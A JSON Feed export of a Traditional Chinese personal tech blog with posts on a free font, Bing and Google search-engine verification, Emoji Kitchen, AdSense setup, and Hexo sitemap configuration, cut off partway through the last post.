{
    "version": "https://jsonfeed.org/version/1",
    "title": "筆記ZONE",
    "description": "",
    "home_page_url": "https://zonego.tw",
    "items": [
        {
            "id": "https://zonego.tw/2024/04/15/iansui-font/",
            "url": "https://zonego.tw/2024/04/15/iansui-font/",
            "title": "芫荽 繁中字型",
            "date_published": "2024-04-15T02:40:10.000Z",
            "content_html": "<span id=\"more\"></span>\n\n<h1 id=\"芫荽-iansui\"><a href=\"#芫荽-iansui\" class=\"headerlink\" title=\"芫荽 &#x2F; iansui\"></a>芫荽 &#x2F; iansui</h1><p>第一套為台灣教育使用所改造的繁體硬筆楷書字型</p>\n<p>An open source Chinese font derived from Klee One (Fontworks).<br>基於 Fontworks 的 Klee One 衍生的開源繁體中文字型。</p>\n<p><img src=\"https://github.com/ButTaiwan/iansui/blob/main/img/iansui_sample.jpg\"></p>\n<h2 id=\"開源授權規定\"><a href=\"#開源授權規定\" class=\"headerlink\" title=\"開源授權規定\"></a>開源授權規定</h2><p>除單獨出售字型檔禁止外，任何人可以無償使用此字型，包含商用。無須告知原作者。</p>\n<h2 id=\"下載\"><a href=\"#下載\" class=\"headerlink\" title=\"下載\"></a>下載</h2><p><a href=\"https://github.com/ButTaiwan/iansui\">GitHub 下載點</a></p>\n<p>在 GitHub 專案的 Release 頁面，點最新版本的 <code>iansui.zip</code> 下載<br><img src=\"/images/content/iansui-font/iansui1.jpg\"><br><img src=\"/images/content/iansui-font/iansui2.jpg\"></p>\n<p>將 <code>iansui.zip</code> 解壓縮後，找到 <code>Iansui-Regular.ttf</code> 點兩下即可安裝。</p>\n<h3 id=\"另外也有發音符號的版本\"><a href=\"#另外也有發音符號的版本\" class=\"headerlink\" title=\"另外也有發音符號的版本\"></a>另外也有發音符號的版本</h3><ul>\n<li><a href=\"https://github.com/ButTaiwan/bpmfvs\">注音芫荽</a> 芫荽的注音字型。</li>\n<li><a href=\"https://github.com/ButTaiwan/taigivs\">字咍芫荽</a> 台語標音字型家族。</li>\n</ul>\n<h2 id=\"圖片、資訊來源：\"><a href=\"#圖片、資訊來源：\" class=\"headerlink\" title=\"圖片、資訊來源：\"></a>圖片、資訊來源：</h2><p><a href=\"https://www.facebook.com/aestheticell/posts/4828133620624562\">美感細胞 教科書再造計畫</a></p>\n",
            "tags": [
                "網路資源",
                "字型"
            ]
        },
        {
            "id": "https://zonego.tw/2023/10/02/BingWebmasterTools/",
            "url": "https://zonego.tw/2023/10/02/BingWebmasterTools/",
            "title": "Bing Webmaster Tools - 讓 Bing 搜尋到部落格內容",
            "date_published": "2023-10-02T03:14:09.000Z",
            "content_html": "<span id=\"more\"></span>\n\n<p>之前寫過讓 Google 主動來爬我們的網站內容，但世界上不只有 google 這個搜尋引擎<br>微軟的搜尋引擎 Bing 雖然不是最多人使用，不過為了增加網站曝光，就來設定 Webmaster Tools 吧<br><del>反正設定也不用錢</del></p>\n<p>其他搜尋引擎請參考</p>\n<ul>\n<li><a href=\"/2023/08/02/google-search-console/\">Google Search Console - 讓 Google 搜尋到部落格內容</a></li>\n</ul>\n<h2 id=\"登入-Microsoft-帳號\"><a href=\"#登入-Microsoft-帳號\" class=\"headerlink\" title=\"登入 Microsoft 帳號\"></a>登入 Microsoft 帳號</h2><p>註冊就跳過吧，應該大家都會<br>真的沒有的話，也可以用 Google 或 FB 帳號登入<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/webmaster-tools/login.jpg\" alt=\"登入\" data-caption=\"登入\" loading=\"lazy\"></p>\n<h2 id=\"從-Google-Search-Console-匯入網站\"><a href=\"#從-Google-Search-Console-匯入網站\" class=\"headerlink\" title=\"從 Google Search Console 匯入網站\"></a>從 Google Search Console 匯入網站</h2><p>登入後選擇新增站點<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/webmaster-tools/add_site.jpg\" alt=\"新增站點\" data-caption=\"新增站點\" loading=\"lazy\"></p>\n<p>如果之前已經設定過 Google Search Console<br>可以連結 Google 帳號，將設定匯入 Bing Webmaster Tools<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/webmaster-tools/add_site2.jpg\" alt=\"新增站點\" data-caption=\"新增站點\" loading=\"lazy\"></p>\n<p><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/webmaster-tools/add_site3.jpg\" alt=\"新增站點\" data-caption=\"新增站點\" loading=\"lazy\"></p>\n<p>由於我的部落格 <a href=\"https://zonego.tw/\">https://zonego.tw</a> 已經匯入過，所以我的 Google 帳號內會沒有其他網站能匯入<br>正常的話這邊選擇網站匯入就可以了<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/webmaster-tools/add_site4.jpg\" alt=\"新增站點\" data-caption=\"新增站點\" loading=\"lazy\"></p>\n<h2 id=\"新增網站至-Webmaster-Tools\"><a href=\"#新增網站至-Webmaster-Tools\" class=\"headerlink\" title=\"新增網站至 Webmaster Tools\"></a>新增網站至 Webmaster Tools</h2><p>新增站點這邊輸入網站的網址<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/webmaster-tools/add_site2.jpg\" alt=\"新增站點\" data-caption=\"新增站點\" loading=\"lazy\"></p>\n<p>以新增 <code>https://example.zonego.tw</code> 為範例<br>下一步就是要驗證網站是你的，有三種驗證方法</p>\n<h3 id=\"1-BingSiteAuth-xml\"><a href=\"#1-BingSiteAuth-xml\" class=\"headerlink\" title=\"1.BingSiteAuth.xml\"></a>1.BingSiteAuth.xml</h3><p>下載驗證用的 BingSiteAuth.xml 檔案，放在網站的根目錄<br><code>https://example.zonego.tw/BingSiteAuth.xml</code><br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/webmaster-tools/verify1.jpg\" alt=\"新增站點\" data-caption=\"新增站點\" loading=\"lazy\"></p>\n<h3 id=\"2-在頁面的-Header-加入驗證資料\"><a href=\"#2-在頁面的-Header-加入驗證資料\" class=\"headerlink\" title=\"2.在頁面的 Header 加入驗證資料\"></a>2.在頁面的 Header 加入驗證資料</h3><p><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/webmaster-tools/verify2.jpg\" alt=\"新增站點\" data-caption=\"新增站點\" loading=\"lazy\"></p>\n<p>在網站的所有頁面 Header 中加入驗證碼</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span><br>  ...<br>  ‹meta name=&quot;msvalidate.01&quot; content=&quot;2218F52174A741F96454DA55D7A664AA&quot; /&gt;<br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-透過DNS驗證網站\"><a href=\"#3-透過DNS驗證網站\" class=\"headerlink\" title=\"3.透過DNS驗證網站\"></a>3.透過DNS驗證網站</h3><p>在網域的DNS紀錄加入 CNAME 轉至 verify.bing.com<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/webmaster-tools/verify3.jpg\" alt=\"新增站點\" data-caption=\"新增站點\" loading=\"lazy\"></p>\n<p>完成之後，對DNS查詢 <code>82d5e001135888feb5576ef02ef31223.zonego.tw</code> 應該轉至 verify.bing.com</p>\n<h2 id=\"設定-Sitemap\"><a href=\"#設定-Sitemap\" class=\"headerlink\" title=\"設定 Sitemap\"></a>設定 Sitemap</h2><p>接下來新增網站的 sitemap 網址，讓微軟的爬蟲知道有哪些公開頁面可以爬資料<br>例如我的網站 sitemap 就放在 <a href=\"https://zonego.tw/sitemap.xml\">https://zonego.tw/sitemap.xml</a><br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/webmaster-tools/sitemap.jpg\" alt=\"新增站點\" data-caption=\"新增站點\" loading=\"lazy\"></p>\n<p>完成之後等待一段時間，在 Bing 搜尋就會找到我們網站的內容了 🎉</p>\n",
            "tags": [
                "Hexo",
                "Blog",
                "搜尋引擎"
            ]
        },
        {
            "id": "https://zonego.tw/2023/09/18/emoji-kitchen/",
            "url": "https://zonego.tw/2023/09/18/emoji-kitchen/",
            "title": "Emoji Kitchen 自己組合出想要的表情符號",
            "date_published": "2023-09-18T04:00:32.000Z",
            "content_html": "<span id=\"more\"></span>\n<h2 id=\"Gboard-鍵盤\"><a href=\"#Gboard-鍵盤\" class=\"headerlink\" title=\"Gboard 鍵盤\"></a>Gboard 鍵盤</h2><p>Google 出的 Gboard 鍵盤上推出 Emoji Kitchen 功能</p>\n<p>Gboard Google Play 商店連結：<a href=\"https://play.google.com/store/apps/details?id=com.google.android.inputmethod.latin\">https://play.google.com/store/apps/details?id=com.google.android.inputmethod.latin</a></p>\n<p>簡單來說，在可以傳圖片的地方 (如 Discord)，用 Gboard 鍵盤輸入兩個 emiji 就可以將融合後的圖片傳出去</p>\n<img src=\"/images/content/emoji_kitchen/Screenshot.jpg\" height=\"500\"/>\n\n<h2 id=\"網頁版\"><a href=\"#網頁版\" class=\"headerlink\" title=\"網頁版\"></a>網頁版</h2><p>當初只在Gboard 鍵盤上的 Emoji Kitchen 合成功能現在開放網頁版啦</p>\n<p>只要在 Google 搜尋 Emoji Kitchen，組合完表情就產生出圖片了</p>\n<p>網址：<a href=\"https://www.google.com/search?q=emoji+kitchen\">https://www.google.com/search?q=emoji+kitchen</a></p>\n<p><img src=\"/images/content/emoji_kitchen/emoji_kitchen.jpg\"><br><img src=\"/images/content/emoji_kitchen/emoji_kitchen2.jpg\"></p>\n<p>要用時需要將圖片下載下來，或是複製圖片網址使用</p>\n<p><img src=\"https://www.gstatic.com/android/keyboard/emojikitchen/20201001/u1f914/u1f914_u1f47b.png?fbx\"></p>\n<figure class=\"highlight markdown\"><table><tr><td class=\"code\"><pre><code class=\"hljs markdown\">&lt;!-- 複製圖片網址範例 --&gt;<br><br>![](<span class=\"hljs-link\">https://www.gstatic.com/android/keyboard/emojikitchen/20201001/u1f914/u1f914_u1f47b.png?fbx</span>)<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"開源版本\"><a href=\"#開源版本\" class=\"headerlink\" title=\"開源版本\"></a>開源版本</h2><p>在 Google 還沒開放網頁版功能之前，一些熱心開發者也做出類似的網站可以線上使用<br>這邊介紹 xsalazar&#x2F;emoji-kitchen</p>\n<p>使用時跟 Google 的網頁版一樣，需要將圖片下載下來，或是複製圖片網址使用</p>\n<p>GitHub：<a href=\"https://github.com/xsalazar/emoji-kitchen\">https://github.com/xsalazar/emoji-kitchen</a><br>Emoji Kitchen：<a href=\"https://emojikitchen.dev/\">https://emojikitchen.dev/</a></p>\n<p><img src=\"/images/content/emoji_kitchen/emoji_kitchen3.jpg\"></p>\n",
            "tags": [
                "Google",
                "網路資源"
            ]
        },
        {
            "id": "https://zonego.tw/2023/08/16/adsense/",
            "url": "https://zonego.tw/2023/08/16/adsense/",
            "title": "Google AdSense 讓你的網站幫你賺錢",
            "date_published": "2023-08-16T07:28:51.000Z",
            "content_html": "<span id=\"more\"></span>\n\n<p>申請 Google 帳號這個步驟就先跳過</p>\n<p>接下來到 AdSense 網站 <a href=\"https://www.google.com/adsense\">https://www.google.com/adsense</a></p>\n<h1 id=\"套用-AdSense\"><a href=\"#套用-AdSense\" class=\"headerlink\" title=\"套用 AdSense\"></a>套用 AdSense</h1><hr>\n<h2 id=\"設定要套用的網站\"><a href=\"#設定要套用的網站\" class=\"headerlink\" title=\"設定要套用的網站\"></a>設定要套用的網站</h2><p>點新增網站之後，打入網站的連結，例如 <a href=\"https://example.com/\">https://example.com</a></p>\n<p>接下來要驗證網站是你的，有兩種方式</p>\n<ul>\n<li>使用 AdSense 程式碼</li>\n<li>使用 Ads.txt 驗證</li>\n</ul>\n<h3 id=\"使用-AdSense-程式碼\"><a href=\"#使用-AdSense-程式碼\" class=\"headerlink\" title=\"使用 AdSense 程式碼\"></a>使用 AdSense 程式碼</h3><p>將 Google 提供的代碼貼到個頁面的 header<br><img src=\"/images/content/AdSense/AdSenseCode.jpg\"></p>\n<p>以這個部落格的為例，nexmoe 這個主題有提供修改 header 的設定</p>\n<p>修改 <code>_config.nexmoe.yml</code>，在 <code>slotHead: </code> 貼上即可</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><code class=\"hljs yaml\"><span class=\"hljs-string\">...</span><br><br><span class=\"hljs-attr\">slotHead:</span> <span class=\"hljs-string\">|</span><br>  <span class=\"hljs-string\">&lt;script</span> <span class=\"hljs-string\">async</span> <span class=\"hljs-string\">src=&quot;https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-ID&quot;</span> <span class=\"hljs-string\">crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"使用-Ads-txt-驗證\"><a href=\"#使用-Ads-txt-驗證\" class=\"headerlink\" title=\"使用 Ads.txt 驗證\"></a>使用 Ads.txt 驗證</h3><p>建議使用這個方式驗證比較省事，如果我們不是用 Ads.txt 驗證網站所有權的話，後面還是要做這一步</p>\n<p><img src=\"/images/content/AdSense/AdSenseAds.jpg\"></p>\n<p>步驟請跳下面說明</p>\n<h2 id=\"Ads-txt\"><a href=\"#Ads-txt\" class=\"headerlink\" title=\"Ads.txt\"></a>Ads.txt</h2><p>詳細請參考 Google 的說明 <a href=\"https://support.google.com/adsense/answer/12171612?hl=zh-Hant\">https://support.google.com/adsense/answer/12171612?hl=zh-Hant</a></p>\n<p>簡單來說，美國為了保護下廣告的客戶，提供銷售廣告位的網站需要提供 <a href=\"https://iabtechlab.com/ads-txt/\">Authorized Digital Sellers</a> (簡稱 ads.txt)</p>\n<h3 id=\"設定-ads-txt\"><a href=\"#設定-ads-txt\" class=\"headerlink\" title=\"設定 ads.txt\"></a>設定 ads.txt</h3><p>如果驗證時不是用這個方式的話，可以點網站進去，Google 會產生 <code>ads.txt</code> 的內容可以複製</p>\n<p><img src=\"/images/content/AdSense/ads.txt.jpg\"></p>\n<p>範例：</p>\n<figure class=\"highlight fortran\"><table><tr><td class=\"code\"><pre><code class=\"hljs fortran\">google.com, pub-XXXXXX, <span class=\"hljs-keyword\">DIRECT</span>, XXXXXXX<br></code></pre></td></tr></table></figure>\n\n<p>以 Hexo 為例子，在 <code>source</code> 資料夾內新增 <code>ads.txt</code>，把剛剛複製的內容貼上<br>修改 <code>_config.yml</code> 設定跳渲染 <code>ads.txt</code> (可參考 <a href=\"/2021/12/15/hexo-skip/\">Hexo 指定文件跳過渲染</a>)</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><code class=\"hljs yml\"><span class=\"hljs-string\">...</span><br><br><span class=\"hljs-attr\">skip_render:</span><br><span class=\"hljs-bullet\">-</span> <span class=\"hljs-string\">ads.txt</span><br></code></pre></td></tr></table></figure>\n\n<h1 id=\"設定付款資料\"><a href=\"#設定付款資料\" class=\"headerlink\" title=\"設定付款資料\"></a>設定付款資料</h1><hr>\n<h2 id=\"付款資料\"><a href=\"#付款資料\" class=\"headerlink\" title=\"付款資料\"></a>付款資料</h2><p>點左側選單 &gt; 付款 &gt; 付款資訊</p>\n<p>付款帳戶的資料基本上不用管它，想要調整收到前的時間可以改付款時間表，最少需要累積到 100 美金才領的出來</p>\n<p><img src=\"/images/content/AdSense/%E4%BB%98%E6%AC%BE%E8%B3%87%E8%A8%8A.jpg\"></p>\n<h2 id=\"美國稅籍資料\"><a href=\"#美國稅籍資料\" class=\"headerlink\" title=\"美國稅籍資料\"></a>美國稅籍資料</h2><p>畢竟 Google 是美國公司，照美國的稅制大概會收 24% 起跳的稅金<br>外國人可以申請 W-8BEN 來降低稅收，只有針對美國人銷售、營利才需要收 30% 稅金</p>\n<p>簡單來說假設你的網站有 100 美元的廣告收入，其中有 10% 的廣告收入是來自美國</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>稅金</th>\n<th>實際收入</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>正常稅率 (未申請 W-8BEN)</td>\n<td>100 * 24% &#x3D; 24</td>\n<td>100 - 24 &#x3D; 76</td>\n</tr>\n<tr>\n<td>有申請 W-8BEN</td>\n<td>(100 * 10%) * 30% &#x3D; 3</td>\n<td>100 - 3 &#x3D; 97</td>\n</tr>\n</tbody></table>\n<p>所以，除非你的網站或 Youtube 頻道主要都是來自美國，不然申請 W-8BEN 扣的稅會比較少</p>\n<p>我是參考雲爸的教學來填寫 <a href=\"https://dacota.tw/blog/post/google-adsense-w-8ben\">https://dacota.tw/blog/post/google-adsense-w-8ben</a></p>\n<blockquote>\n<p>付款資料內的姓名記得填護照的英文姓名，不然需要在另外上傳護照證明稅及跟帳號擁有者是同一人</p>\n</blockquote>\n<h2 id=\"付款方式\"><a href=\"#付款方式\" class=\"headerlink\" title=\"付款方式\"></a>付款方式</h2><p>付款方式要累積到能第一次領錢才能設定</p>\n<p>台灣能使用的有2種方式</p>\n<ul>\n<li>美元支票</li>\n<li>電匯</li>\n</ul>\n<p><a href=\"https://lashiblog.com/google-adsense-payments/\">https://lashiblog.com/google-adsense-payments/</a></p>\n<h1 id=\"安插廣告\"><a href=\"#安插廣告\" class=\"headerlink\" title=\"安插廣告\"></a>安插廣告</h1><hr>\n<p>安插廣告到網站裡面有2種作法，自動廣告跟手動廣告</p>\n<h2 id=\"自動廣告\"><a href=\"#自動廣告\" class=\"headerlink\" title=\"自動廣告\"></a>自動廣告</h2><p>在左邊選單 廣告 &gt; 按網站 &gt; 選你要啟用自動廣告的網站</p>\n<p><img src=\"/images/content/AdSense/auto.jpg\"></p>\n<p>這邊啟用之後就會自動在網站內插入廣告 (因為是自動，廣告可能會插在文中)</p>\n<h2 id=\"手動插入廣告\"><a href=\"#手動插入廣告\" class=\"headerlink\" title=\"手動插入廣告\"></a>手動插入廣告</h2><p>在左邊選單 廣告 &gt; 按廣告單元</p>\n<p><img src=\"/images/content/AdSense/%E6%89%8B%E5%8B%95%E5%BB%A3%E5%91%8A.jpg\"></p>\n<p>在這邊依照合適的版面類型建立廣告，建完之後會有給你廣告的代碼<br>代碼大概分為三個部分</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!--請放在 Header，只需要放一次--&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-ID&quot;</span></span><br><span class=\"hljs-tag\">     <span class=\"hljs-attr\">crossorigin</span>=<span class=\"hljs-string\">&quot;anonymous&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br><br><span class=\"hljs-comment\">&lt;!--放在頁面內你想出現廣告的地方，可在頁面內放多次--&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">ins</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">&quot;adsbygoogle&quot;</span></span><br><span class=\"hljs-tag\">     <span class=\"hljs-attr\">style</span>=<span class=\"hljs-string\">&quot;display:block; text-align:center;&quot;</span></span><br><span class=\"hljs-tag\">     <span class=\"hljs-attr\">data-ad-layout</span>=<span class=\"hljs-string\">&quot;in-article&quot;</span></span><br><span class=\"hljs-tag\">     <span class=\"hljs-attr\">data-ad-format</span>=<span class=\"hljs-string\">&quot;fluid&quot;</span></span><br><span class=\"hljs-tag\">     <span class=\"hljs-attr\">data-ad-client</span>=<span class=\"hljs-string\">&quot;ca-pub-ID&quot;</span></span><br><span class=\"hljs-tag\">     <span class=\"hljs-attr\">data-ad-slot</span>=<span class=\"hljs-string\">&quot;廣告單元ID&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">ins</span>&gt;</span><br><br><span class=\"hljs-comment\">&lt;!--放在頁面最後，只需要放一次--&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">     (adsbygoogle = <span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">adsbygoogle</span> || []).<span class=\"hljs-title function_\">push</span>(&#123;&#125;);</span><br><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>詳細可參考Google的說明<a href=\"https://support.google.com/adsense/answer/9190028?sjid=17637765633261310327-AP\">https://support.google.com/adsense/answer/9190028?sjid=17637765633261310327-AP</a></p>\n",
            "tags": [
                "Google",
                "廣告"
            ]
        },
        {
            "id": "https://zonego.tw/2023/08/02/google-search-console/",
            "url": "https://zonego.tw/2023/08/02/google-search-console/",
            "title": "Google Search Console - 讓 Google 搜尋到部落格內容",
            "date_published": "2023-08-02T04:52:15.000Z",
            "content_html": "<span id=\"more\"></span>\n<p>建好一個新網站，在搜尋引擎爬到你的網站之前，當然會搜尋不到任何東西</p>\n<p>那 Google 甚麼時候會時候會來爬我的網站? 真的就是<em>隨緣</em></p>\n<p>要主動讓搜尋引擎認識你的網站? 那就是要來設定 Google Search Console</p>\n<p>其他搜尋引擎請參考</p>\n<ul>\n<li><a href=\"/2023/10/02/BingWebmasterTools/\">Bing Webmaster Tools - 讓 Bing 搜尋到部落格內容</a></li>\n</ul>\n<h2 id=\"新增網站的-Sitemap\"><a href=\"#新增網站的-Sitemap\" class=\"headerlink\" title=\"新增網站的 Sitemap\"></a>新增網站的 Sitemap</h2><p>去 Google 設定之前，我們需要先將搜尋引擎需要的網站地圖 sitemap.xml 產生出來。<br>教學請看這篇 <a href=\"/2023/07/26/hexo-sitemap/\">Hexo 自動產生網站的 sitemap</a></p>\n<h2 id=\"在-Google-Search-Console-新增網站\"><a href=\"#在-Google-Search-Console-新增網站\" class=\"headerlink\" title=\"在 Google Search Console 新增網站\"></a>在 Google Search Console 新增網站</h2><h3 id=\"註冊-Google-帳號\"><a href=\"#註冊-Google-帳號\" class=\"headerlink\" title=\"註冊 Google 帳號\"></a>註冊 Google 帳號</h3><p>這部份相信大家都會，跳過</p>\n<h3 id=\"新增網站\"><a href=\"#新增網站\" class=\"headerlink\" title=\"新增網站\"></a>新增網站</h3><p>接下來到 Google Search Console 去設定爬蟲來抓我們的網站<br>Google Search Console 網址： <a href=\"https://search.google.com/search-console\">https://search.google.com/search-console</a></p>\n<p><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/google_search_console/%E6%96%B0%E5%A2%9E%E7%AB%99%E9%BB%9E.png\" alt=\"新增網站\" data-caption=\"新增網站\" loading=\"lazy\"></p>\n<p>資源類型分為兩類，網站前置字元代表只索引單一網站，網域則是歸在該網域下的所有網站都會索引。<br>沒有特殊需求的話選網站前置字元就好。<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/google_search_console/%E8%B3%87%E6%BA%90%E9%A1%9E%E5%9E%8B.png\" alt=\"新增網站\" data-caption=\"新增網站\" loading=\"lazy\"></p>\n<h2 id=\"驗證網站\"><a href=\"#驗證網站\" class=\"headerlink\" title=\"驗證網站\"></a>驗證網站</h2><p>把要索引的網站打進去後，接下來要驗證網站是你的<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/google_search_console/%E9%A9%97%E8%AD%89%E6%96%B9%E5%BC%8F.png\" alt=\"新增網站\" data-caption=\"新增網站\" loading=\"lazy\"></p>\n<p>下面的驗證方式選一個就好</p>\n<h3 id=\"HTML-檔案\"><a href=\"#HTML-檔案\" class=\"headerlink\" title=\"HTML 檔案\"></a>HTML 檔案</h3><p>預設最簡單的驗證方式，只要將 google 提供的驗證用 html 檔案下載，放在 hexo 的目錄即可<br>網站部屬之後可以在 <a href=\"https://yoursite.com/googleXXXXXXXXXXXXXXXX.html\">https://yoursite.com/googleXXXXXXXXXXXXXXXX.html</a> 看到驗證碼就可以去點驗證了</p>\n<blockquote>\n<p>記得在 <code>_config.yml</code> 加入跳過這個檔案的渲染 詳細請看 <a href=\"/2021/12/15/hexo-skip/\">Hexo 指定文件跳過渲染</a></p>\n</blockquote>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">skip_render:</span><br><span class=\"hljs-bullet\">-</span> <span class=\"hljs-string\">googleXXXXXXXXXXXXXXXX.html</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"HTML-標記\"><a href=\"#HTML-標記\" class=\"headerlink\" title=\"HTML 標記\"></a>HTML 標記</h3><p>在首頁的 Header 內加入驗證碼</p>\n<p><a href=\"https://yoursite.com/index.html\">https://yoursite.com/index.html</a></p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">&quot;google-site-verification&quot;</span> <span class=\"hljs-attr\">content</span>=<span class=\"hljs-string\">&quot;key-XXX&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"Google-Analytics\"><a href=\"#Google-Analytics\" class=\"headerlink\" title=\"Google Analytics\"></a>Google Analytics</h3><p>如果你的網站有使用  Google Analytics 的話可以直接點驗整就好，反正也在設定 GA 時也算驗證過網站所有者了</p>\n<h3 id=\"網域名稱供應商\"><a href=\"#網域名稱供應商\" class=\"headerlink\" title=\"網域名稱供應商\"></a>網域名稱供應商</h3><p>在 DNS 內加入相同網域的 TXT 紀錄，裡面放驗證碼即可驗證<br>如果是 cloud flare 的話就更簡單，只要照著點就好了<br>不過設定時要注意衝突<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/google_search_console/DNS.png\" alt=\"新增網站\" data-caption=\"新增網站\" loading=\"lazy\"></p>\n<h2 id=\"完成\"><a href=\"#完成\" class=\"headerlink\" title=\"完成\"></a>完成</h2><p>驗證完之後等待 google 把 sitemap 內的頁面索引完，在 Google 搜尋你的網站可以被搜尋到了<br>後續 google 會提是你的網站有什麼問題需要修正，未修正前會被排到搜尋列表的後面<br>要被演算法排到前面就需要做 SEO (search engine optimizaton) 了</p>\n",
            "tags": [
                "Hexo",
                "Blog",
                "搜尋引擎",
                "Google"
            ]
        },
        {
            "id": "https://zonego.tw/2023/07/26/hexo-sitemap/",
            "url": "https://zonego.tw/2023/07/26/hexo-sitemap/",
            "title": "Hexo 自動產生網站的 sitemap",
            "date_published": "2023-07-26T05:18:46.000Z",
            "content_html": "<p>Sitemap 意思為網站地圖，主要是提供給搜尋引擎知道，這個網站有哪些頁面。<br>當然，如果你喜歡看原始的 xml 檔，也可以給人看。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"hexo-generator-sitemap\"><a href=\"#hexo-generator-sitemap\" class=\"headerlink\" title=\"hexo-generator-sitemap\"></a>hexo-generator-sitemap</h2><p>GitHub: <a href=\"https://github.com/hexojs/hexo-generator-sitemap\">https://github.com/hexojs/hexo-generator-sitemap</a></p>\n<p>這個插件在我們部署 hexo 網站時，會自動幫我們產生 sitemap.xml</p>\n<h2 id=\"安裝\"><a href=\"#安裝\" class=\"headerlink\" title=\"安裝\"></a>安裝</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\">npm install hexo-generator-sitemap --save<br></code></pre></td></tr></table></figure>\n\n<p>Hexo 版本對應使用插件的版本</p>\n<table>\n<thead>\n<tr>\n<th>Hexo</th>\n<th>插件</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Hexo 4</td>\n<td>2.x</td>\n</tr>\n<tr>\n<td>Hexo 3</td>\n<td>1.x</td>\n</tr>\n<tr>\n<td>Hexo 2</td>\n<td>0.x</td>\n</tr>\n</tbody></table>\n<h2 id=\"調整設定\"><a href=\"#調整設定\" class=\"headerlink\" title=\"調整設定\"></a>調整設定</h2><h3 id=\"修改-Hexo-的設定檔-config-yml\"><a href=\"#修改-Hexo-的設定檔-config-yml\" class=\"headerlink\" title=\"修改 Hexo 的設定檔 _config.yml\"></a>修改 Hexo 的設定檔 <code>_config.yml</code></h3><p>設定範例:</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><code class=\"hljs yaml\"><span class=\"hljs-string\">...</span><br><br><span class=\"hljs-attr\">sitemap:</span><br>  <span class=\"hljs-attr\">path:</span><br>    <span class=\"hljs-bullet\">-</span> <span class=\"hljs-string\">sitemap.xml</span><br>    <span class=\"hljs-bullet\">-</span> <span class=\"hljs-string\">sitemap.txt</span><br>  <span class=\"hljs-attr\">template:</span> <span class=\"hljs-string\">./sitemap_template.xml</span><br>  <span class=\"hljs-attr\">template_txt:</span> <span class=\"hljs-string\">./sitemap_template.txt</span><br>  <span class=\"hljs-attr\">rel:</span> <span class=\"hljs-literal\">false</span><br>  <span class=\"hljs-attr\">tags:</span> <span class=\"hljs-literal\">true</span><br>  <span class=\"hljs-attr\">categories:</span> <span class=\"hljs-literal\">true</span><br></code></pre></td></tr></table></figure>\n<table>\n<thead>\n<tr>\n<th>參數</th>\n<th>說明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>path</td>\n<td>產生的 sitemap 檔案位置<br>範例的寫法就是 <a href=\"http://localhost:4000/sitemap.xml\">http://localhost:4000/sitemap.xml</a><br>如果不要生成 txt 格式可以不寫 <code>- sitemap.txt</code></td>\n</tr>\n<tr>\n<td>template</td>\n<td>用於產生 sitemap.xml 的模版檔案位置</td>\n</tr>\n<tr>\n<td>template_txt</td>\n<td>用於產生 sitemap.txt 